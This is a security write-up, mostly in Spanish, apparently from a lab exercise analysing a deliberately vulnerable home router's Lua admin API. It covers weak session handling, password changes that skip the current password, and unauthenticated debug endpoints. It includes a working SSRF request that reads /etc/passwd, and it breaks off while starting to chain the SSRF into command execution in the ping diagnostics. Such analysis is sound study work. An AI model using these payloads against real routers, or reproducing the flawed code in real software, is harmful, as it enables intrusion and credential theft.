# Introduction
In this section we are analyzing the vulnerabilities present in the internal API of the vulnerable home router. This API is used for administration purposes, and it is accessible from the local network in `http://192.168.2.1:80`.

# API2:2023 Broken Authentication

En el mecanismo de autenticación de nuestra API para administrar el router se detectan algunas características principales propias de una _autenticación inadecuada._

## 1. Gestión de sesiones vulnerable

En la función de creación de una sesión, no existe ningún *rate limiting* ni protección contra ataques de fuerza bruta:
```lua
local function session_setup(user, pass, allowed_users)

	if util.contains(allowed_users, user) then

		local login = util.ubus("session", "login", {

			username = user,

			password = pass,

			timeout = tonumber(luci.config.sauth.sessiontime)

		})
```

## 2. Generación de token débil
```lua
util.ubus("session", "set", {

		ubus_rpc_session = login.ubus_rpc_session,

		values = { token = sys.uniqueid(16) }
})
```

## 3. Validación insuficiente

No existe validación del origen del token CSRF.

```lua
function test_post_security()

	if http.getenv("REQUEST_METHOD") ~= "POST" then
		http.status(405, "Method Not Allowed")
		http.header("Allow", "POST")
		return false
	end
	
	if http.formvalue("token") ~= context.authtoken then
		http.status(403, "Forbidden")
		luci.template.render("csrftoken")
		return false
	end

	return true
end
```

Como tampoco se verifica bien la sesión que se va a devolver:
```lua
local function session_retrieve(sid, allowed_users)

	local sdat = util.ubus("session", "get", { ubus_rpc_session = sid })
	
	  
	
	if type(sdat) == "table" and
		type(sdat.values) == "table" and
		type(sdat.values.token) == "string" and
		(not allowed_users or
		util.contains(allowed_users, sdat.values.username))
	then
		uci:set_session_id(sid)
		return sid, sdat.values
	end
	return nil, nil
end
```

No se verifica la dirección IP de origen, tampoco la fecha de expiración del token, ni tampoco la consistencia del User-Agent.

## Falta de validación de contraseña actual

El código permite cambiar la contraseña del administrador **sin verificar la contraseña actual.** Confía en la autenticación plenamente previa que se ha hecho para llegar al panel de administración.

```lua
function m.parse(map)
    local v1 = pw1:formvalue("_pass")
    local v2 = pw2:formvalue("_pass")

    if v1 and v2 and #v1 > 0 and #v2 > 0 then
        if v1 == v2 then
            -- VULNERABILIDAD: Cambia la contraseña sin verificar la actual
            if luci.sys.user.setpasswd(luci.dispatcher.context.authuser, v1) == 0 then
                m.message = translate("Password successfully changed!")
            else
                m.message = translate("Unknown Error, password not changed!")
            end
        else
            m.message = translate("Given password confirmation did not match, password not changed!")
        end
    end

    Map.parse(map)
end
```

# API7:2023 Server Side Request Forgery

El desarrollador dejó un archivo para hacer *debugging* y poder probar la conexión a diferentes puntos del sistema para ver si las evaluaciones de URL's y conexiones dentro de la misma red funcionaban. Para ello usó una ruta alternativa y fuera del path del nodo padre *dispatch.lua* por lo que no es necesario autenticarse para usar este *endpoint*.

```lua
function index()
	local api_node = entry({"api"}, firstchild(), _("API"), 10)
	api_node.sysauth = false
	
	local v1_node = entry({"api", "v1"}, firstchild(), _("API v1"), 20)
	v1_node.sysauth = false
	
	local check_node = entry({"api", "v1", "check"}, call("check_service"), _("Network Service Check"), 60)
	check_node.sysauth = false
	
	local ping_node = entry({"api", "v1", "ping"}, call("ping_host"), _("Ping Host"), 61)
	ping_node.sysauth = false
	
	local status_node = entry({"api", "v1", "status"}, call("service_status"), _("Service Status"), 62)
	status_node.sysauth = false
	
	local tools_node = entry({"tools"}, firstchild(), _("Tools"), 30)
	tools_node.sysauth = false
	
	local ping_simple = entry({"tools", "ping"}, call("ping_host"), _("Ping Tool"), 70)
	ping_simple.sysauth = false
	
	local check_simple = entry({"tools", "check"}, call("check_service"), _("Network Check"), 71)
	check_simple.sysauth = false
end
```

Además, si listamos las herramientas y paquetes instalados, se puede ver que en la fase de desarrollo se dejó instalado *curl*, seguramente para llevar a cabo estas pruebas.

Haciendo uso de esta entrada podemos ver que el servidor recibe las peticiones y reporta resultados:

```shell
❯ curl -X GET "http://192.168.1.1/cgi-bin/luci/api/v1/check?url=file:///etc/passwd"
{"vulnerability":"SSRF_WITHOUT_AUTH","requester":"192.168.1.2","timestamp":1750736334,"status":"success","url":"file:\/\/\/etc\/passwd","headers":[],"response":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0root:x:0:0:root:\/root:\/bin\/ash\nntp:x:123:123:ntp:\/var\/run\/ntp:\/bin\/false\ndnsmasq:x:453:453:dnsmasq:\/var\/run\/dnsmasq:\/bin\/false\nlogd:x:514:514:logd:\/var\/run\/logd:\/bin\/false\nubus:x:81:81:ubus:\/var\/run\/ubus:\/bin\/false\nnetwork:x:101:101:network:\/var\/run\/network:\/bin\/false\nopenwrtuser:x:1000:1000:root:\/root:\/bin\/ash\nanonymous:x:1001:1001::\/tmp\/ftp:\/bin\/ash\nnobody:x:1002:1002::\/var:\/bin\/false\n\r100   390  100   390    0     0   455k      0 --:--:-- --:--:-- --:--:--  380k\n"}%
```

### RCE en Diagnostics

En la sección *Network* existe una entrada llamada *Diagnostics* la cual permite realizar ciertas ejecuciones de comandos: *ping, traceroute, nslookup.* Si analizamos el código que se encarga de estas funcionalidades nos damos cuenta de que tiene un problema:

```lua
138: page = entry({"admin", "network", "diag_ping"}, call("diag_ping"), nil)
```

En el archivo *network.lua*, que es donde se encuentran las distintas funcionalidades, vemos que la llamada a la función *diag_ping* que se encarga de ejecutar el comando usa *call()*, el cual permite tanto peticiones POST como GET. Si hiciesemos analizamos un paquete enviado al servidor usando este servicio vemos que podemos obviar ciertos campos de autenticación básicos. Aún así, necesitamos la cookie *syauth* para que se nos permita hacer uso de esta función. Es aquí donde entra el uso del **SSRF** previamente descubierto. Si hacemos una petición al enpoint del *ping* haciendo uso del propio servidor vemos lo siguiente:
